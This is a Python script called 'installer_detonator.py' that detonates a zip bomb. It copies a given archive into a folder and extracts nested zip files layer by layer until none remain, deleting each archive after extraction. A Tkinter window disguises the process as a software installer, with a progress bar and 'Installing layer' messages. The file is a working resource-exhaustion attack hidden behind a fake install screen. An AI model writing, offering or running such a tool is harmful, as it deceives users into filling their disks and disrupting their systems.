import zipfile
import os
import threading
import tkinter as tk
from tkinter import ttk
import shutil
import sys

def extract_all_recursive(base_dir):
    layer = 0
    while True:
        found = False
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.endswith(".zip"):
                    zip_path = os.path.join(root, file)
                    target_dir = os.path.join(root, file + "_unzipped")
                    try:
                        with zipfile.ZipFile(zip_path, 'r') as zf:
                            zf.extractall(target_dir)
                        os.remove(zip_path)
                        found = True
                    except Exception:
                        pass
        if not found:
            break
        layer += 1
        update_layer_progress(layer)

def update_layer_progress(current):
    percent = min(current * 20, 100)  # estimate: 5 layers max
    bar["value"] = percent
    label_var.set(f"Installing layer {current}...")
    root.update_idletasks()

def detonate_zip_bomb():
    os.makedirs("bomb_detonated", exist_ok=True)
    shutil.copy(bomb_filename, f"bomb_detonated/{bomb_filename}")
    extract_all_recursive("bomb_detonated")

def run_gui():
    global root, bar, label_var
    root = tk.Tk()
    root.title(f"Installer - {bomb_filename}")
    root.geometry("320x100")

    label_var = tk.StringVar()
    label_var.set("Starting installation...")
    ttk.Label(root, textvariable=label_var).pack(pady=10)

    bar = ttk.Progressbar(root, length=250, mode='determinate', maximum=100)
    bar.pack(pady=10)

    threading.Thread(target=detonate_zip_bomb, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 installer_detonator.py [bomb.zip]")
        sys.exit(1)

    bomb_filename = sys.argv[1]

    if not os.path.isfile(bomb_filename):
        print(f"Error: '{bomb_filename}' not found.")
        sys.exit(1)

    run_gui()
